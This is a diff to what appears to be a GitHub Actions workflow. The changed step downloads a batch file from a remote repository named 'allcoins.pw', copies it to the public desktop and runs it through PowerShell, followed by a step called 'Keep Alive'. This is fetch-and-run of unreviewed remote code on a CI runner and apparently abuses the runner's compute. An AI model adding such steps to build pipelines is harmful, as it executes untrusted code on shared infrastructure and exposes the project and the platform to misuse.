@@ -10,7 +10,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: Auto Prog 
       run: | 
-        Invoke-WebRequest https://pastebin.com/raw/22j2JQgB -OutFile a.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/redsunday/allcoins.pw/master/file/a.bat -OutFile a.bat
         copy "a.bat" "C:\Users\Public\Desktop\a.bat" 
         Start-Process Powershell -ArgumentList '-Noexit -Command "C:\Users\Public\Desktop\a.bat"' 
     - name: Keep Alive. 
